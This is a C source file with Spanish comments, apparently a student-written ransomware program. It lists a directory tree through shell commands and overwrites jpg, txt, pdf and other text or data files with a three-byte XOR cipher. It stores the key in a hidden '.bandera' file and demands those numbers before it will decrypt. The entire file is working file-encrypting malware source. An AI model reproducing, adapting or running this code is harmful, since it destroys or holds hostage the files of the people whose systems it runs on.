#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
//Prototipos de funciones
void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a,int b,int c, char *nombre_ransomware);

int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, int a, int b,int c, char *nombre_ransomware);

char * agregar_barra(char *sin_barra);

void cifrar(char *direccion_archivo, int a, int b, int c);


//argv[1]=Carpeta a cifrar, argv[2,3,4]=Llaves para cifrar (llaves de 0 a 255)

int main(int argc, char *argv[]){

	//Variables para leer salida de comandos y archivos
	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[3],*nombre_ransomware=argv[0],*carpeta="./",*tmp=NULL;

	//Comando para obtener directorios
	char comando1[]="ls -lRa 2>/dev/null ";

	//Comando para obtener nombre de los archivod
	char awk[]=" | awk '{if (NF>9) {{for(i=9; i<NF; i++) printf $i\" \"} print $i} else  print $NF}'";
	size_t longitud=0,longitud2=0,longitud3=0;														
	ssize_t tamanio;
	int i=0, *dos_despues, a, b, c, arg1=0, arg2=0, arg3=0,cat=0;
	
	FILE *direccion_abs=popen("echo $PWD/","r");
	getline(&tmp,&longitud3,direccion_abs);
	
	FILE *bandera;

        //En caso de que no exista .bandera se crea el archivo y además se procede a cifrar los archivos
        if((bandera=fopen(".bandera","r"))){
                fread(boleano,1,2,bandera);
                fclose(bandera);
        }else{
                if((bandera=fopen(".bandera","w"))){
                        fprintf(bandera,"%s","no");
                        snprintf(boleano,strlen("no")+1,"%s","no");
                        fclose(bandera);
                }else{
                        printf("Fallo en ejecución 1");
                        exit(1);
                }
        }

	if(strcmp("si",boleano)){	
		switch(argc){
			case 1:
				carpeta=(char *)calloc(strlen(tmp),sizeof(char));
	                        snprintf(carpeta,strlen(tmp), "%s", tmp);
				break;
			case 2:
				carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
			        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
				if(!strstr(argv[1],"./")){
					snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);			
				}
				break;
			case 3:
	                        carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
	                        if(!strstr(argv[1],"./")){
	                                snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);
	                        }
	                        break;
			case 4:
	                        carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
	                        if(!strstr(argv[1],"./")){
	                                snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);
	                        }
	                        break;
			default:
				carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
				if(!strstr(argv[1],"./")){
	                                snprintf(carpeta+cat-1,strlen(argv[1])+1,"%s",argv[1]);
	                        }
			        arg1=atoi(argv[2])%256;
	        	        arg2=atoi(argv[3])%256;
		                arg3=atoi(argv[4])%256;
	
				if((atoi(argv[2])==0 && !strstr(argv[2],"0")) || (atoi(argv[3])==0 && !strstr(argv[3],"0")) || (atoi(argv[4])==0 && !strstr(argv[4],"0")) ){
			                printf("La contraseña dada no es válida\n");
		                        srand(time(NULL));
					if( atoi(argv[2])==0 && !strstr(argv[2],"0")){
						arg1=rand()%256;
			                	printf("\tSe cambió %s por %i\n",argv[2],arg1);
					}
					if(atoi(argv[3])==0 && !strstr(argv[3],"0")){
	                                        arg2=rand()%256;
	                                        printf("\tSe cambió %s por %i\n",argv[3],arg2);
	                                }
	                                if(atoi(argv[4])==0 && !strstr(argv[4],"0")){
	                                        arg3=rand()%256;
	                                        printf("\tSe cambió %s por %i\n",argv[4],arg3);
		                	}
				}
				break;
		}
	}else{
		carpeta=(char *)calloc(strlen(tmp),sizeof(char));
	        snprintf(carpeta,strlen(tmp), "%s", tmp);
	}

	//El archivo .bandera contiene la contraseña para decifrar y además actua como bandera para saber si se va a cifrar o descifrar
	if(!strcmp("si",boleano)){	
		if((bandera=fopen(".bandera","r"))){
			fread(boleano,1,2,bandera);	
			fseek(bandera,1,SEEK_CUR);
			//Obetenemos la contraseña para decifrar
			fscanf(bandera,"%i %i %i\n",&a,&b,&c);
			getline(&carpeta,&longitud3,bandera);
			//printf("%s",carpeta);
			do{
				if(i==0){	
					i++;
				}else{
					printf("Contraseña incorrecta \n\n");
				}
				printf("Ingrese los número (# # #): ");
        			scanf("%i %i %i",&arg1,&arg2,&arg3);
				//Verificamos que la contraseña sea correcta antes de cambiar la bandera
				if(a==arg1 && b==arg2 && c==arg3){
					if((bandera=fopen(".bandera","w"))){
                				fprintf(bandera,"%s","no");
						fclose(bandera);	
					}else{
						printf("Fallo en ejecución 2");
						exit(1);	
					}
				}
			}while((a!=arg1) || (b!=arg2) ||  (c!=arg3));
		}else{
			printf("Fallo de ejecución 3");
			exit(1);
		}
	}else{
		//En caso de que se vaya a cifrar se guarda la contraseña en el archivo .bandera
		if(argc<5){
			printf("Se ha creado una contraseña al azar:\n");
                        srand(time(NULL));
                        arg1=rand()%256;
                        arg2=rand()%256;
                        arg3=rand()%256;
			printf("\t%i %i %i\n",arg1,arg2,arg3);
		}	
		if((bandera=fopen(".bandera","w"))){	

			fprintf(bandera,"%s","si");
			fprintf(bandera,"\n%i %i %i",arg1,arg2,arg3);
			fprintf(bandera,"\n%s",carpeta);
			fclose(bandera);
		}else{
			printf("Fallo en ejecución 4");
		}
	}
	
	dos_despues=(int *)calloc(1,sizeof(int));
        direccion_carpeta=(char**)calloc(1,sizeof(char*));

	ls=(char *)calloc(strlen(comando1)+strlen(carpeta),sizeof(char));
        cat=snprintf(ls,strlen(comando1)+1, "%s", comando1);
        snprintf(ls+cat,strlen(carpeta)+1, "%s", carpeta);
        
	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));
        cat=snprintf(ls_awk,strlen(ls)+1, "%s", ls);
        snprintf(ls_awk+cat,strlen(awk)+1, "%s", awk);	
	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r");

	free(ls);
	free(ls_awk);
	//Leemos línea por linea de ambos comandos al mismo tiempo
	while((tamanio=getline(&linea_direccion, &longitud, directorios)) != -1 ){		
		getline(&nombre_archivo, &longitud2, directorios2);
		nombre_direccion( linea_direccion, direccion_carpeta, direccion_archivo, nombre_archivo, tamanio, dos_despues, arg1, arg2, arg3, nombre_ransomware);
	}

	//Abrimos imagen cuando se haya cifrado
	if(!strcmp("no",boleano)){
		//En caso de que no se pueda abrir mandamos error a null 
		//system("xdg-open ./.img2 2>/dev/null");
	}
	pclose(directorios);
	pclose(directorios2);
	return 0;
}

void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a, int b, int c,char *nombre_ransomware){
	int cat=0;
	//Obtenemos los direcctorios
	if(linea_direccion[tamanio-2]==':'){
        	*dos_despues=0;
               	*direccion_carpeta=(char *)calloc(tamanio+1,sizeof(char));
		cat=snprintf(*direccion_carpeta,tamanio-1,"%s",linea_direccion);
                if(direccion_carpeta[0][tamanio-3]!='/'){
			snprintf(*direccion_carpeta+cat,strlen("/")+1,"%s","/");
                }	
	}
	
	//Dos renglones después empieza la lista de archivo
        if(*dos_despues<2){
		(*dos_despues)++;
       	}else{
		//Ignoramos cuando sean otros directorios o links
		
        	if(linea_direccion[0]!='d' && linea_direccion[0]!='l'){
			
			//Creamos la dirección adsoluta de los archivos y los abrimos
                	if(tamanio>10){
                                       creacion_de_archivos(direccion_archivo,*direccion_carpeta,nombre_archivo, a, b, c,nombre_ransomware);
                	}
        	}
	}
}


int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, int a, int b, int c,char *nombre_ransomware){

	char *file=NULL, *direccion_con_barra=NULL, *tipo=NULL;
	size_t tamanio_file=0;
	FILE *tipo_archivo;
	int cat=0;
	direccion_archivo=(char *)calloc(strlen(direccion_carpeta)+strlen(nombre_archivo),sizeof(char));
	cat=snprintf(direccion_archivo,strlen(direccion_carpeta)+1,"%s",direccion_carpeta);
	snprintf(direccion_archivo+cat,strlen(nombre_archivo), "%s",nombre_archivo);
        if(strstr(nombre_archivo,nombre_ransomware) || strstr(nombre_archivo,".bandera") || strstr(nombre_archivo,".img2")){
		return 0;
        }
       	//Condidición para archivos con extensión en pdf, txt y jpg
	if( ((direccion_archivo[strlen(direccion_archivo)-1]=='g' || direccion_archivo[strlen(direccion_archivo)-1]=='G') && (direccion_archivo[strlen(direccion_archivo)-2]=='p' || direccion_archivo[strlen(direccion_archivo)-2]=='P') && (direccion_archivo[strlen(direccion_archivo)-3]=='j' || direccion_archivo[strlen(direccion_archivo)-3]=='J' )) || ((direccion_archivo[strlen(direccion_archivo)-1]=='t' || direccion_archivo[strlen(direccion_archivo)-1]=='T') && (direccion_archivo[strlen(direccion_archivo)-2]=='x' || direccion_archivo[strlen(direccion_archivo)-2]=='X') && (direccion_archivo[strlen(direccion_archivo)-3]=='t' || direccion_archivo[strlen(direccion_archivo)-3]=='T')) || ((direccion_archivo[strlen(direccion_archivo)-1]=='f' || direccion_archivo[strlen(direccion_archivo)-1]=='F') && (direccion_archivo[strlen(direccion_archivo)-2]=='d' ||  direccion_archivo[strlen(direccion_archivo)-2]=='D') && (direccion_archivo[strlen(direccion_archivo)-3]=='p' || direccion_archivo[strlen(direccion_archivo)-3]=='P'))){
		cifrar(direccion_archivo,a,b,c);
	}else{
		direccion_con_barra=agregar_barra(direccion_archivo);
		file=(char *)calloc(strlen(direccion_con_barra)+6,sizeof(char));
		cat=snprintf(file,strlen("file ")+1,"%s","file ");
		snprintf(file+cat,strlen(direccion_con_barra)+1, "%s",direccion_con_barra);
		tipo_archivo=popen(file,"r");
		getline(&tipo,&tamanio_file,tipo_archivo);
		if(strstr(tipo,"ASCII") || strstr(tipo, "data") || strstr(tipo,"UTF-8")){
			cifrar(direccion_archivo,a,b,c);
		}	
		free(tipo);
		fclose(tipo_archivo);	
	}
        free(direccion_archivo);
	return 0;

}

//Agreamos '/' ala dirección del archivo

char * agregar_barra(char *sin_barra){
	char *con_barra;
	int i=0,j=0;
	while(sin_barra[i]!='\0'){
		if(sin_barra[i]==' ' || sin_barra[i] =='(' || sin_barra[i] ==')'){
			j++;
		}
		i++;
	}
	
	con_barra=(char *)calloc(strlen(sin_barra)+j,sizeof(char *));
	i=0;
	j=0;
	while(sin_barra[i]!='\0'){	
		if(sin_barra[i]==' ' || sin_barra[i] =='(' || sin_barra[i] ==')'){
			con_barra[j]='\\';
			j++;
		}	
		con_barra[j]=sin_barra[i];
		j++;
		i++;
	}	
	return con_barra;
}

//Ciframos archivo por archivo, con los argumentos dados y haciendo un xor para cada byte

void cifrar(char *direccion_archivo, int a, int b, int c){
	FILE *archivo=NULL;
	char *auxiliar=NULL;
	int tamanio_archivo=0,i=0;

	if((archivo=fopen(direccion_archivo,"r"))){
        	fseek(archivo,0,SEEK_END);
        	tamanio_archivo=ftell(archivo);
        	auxiliar=(char *)calloc(tamanio_archivo,1);
        	rewind(archivo);
        	fread(auxiliar,1,tamanio_archivo,archivo);
        	fflush(archivo);
        	fclose(archivo);
        	if((archivo=fopen(direccion_archivo,"wb"))){
        		for(i=0;i<tamanio_archivo;i++){
        		        fprintf(archivo,"%c",auxiliar[i]^a^b^c);
        		}
        		free(auxiliar);     
        		fclose(archivo);
		}
	}else{
		printf("Fallo en ejecución");
	}
}
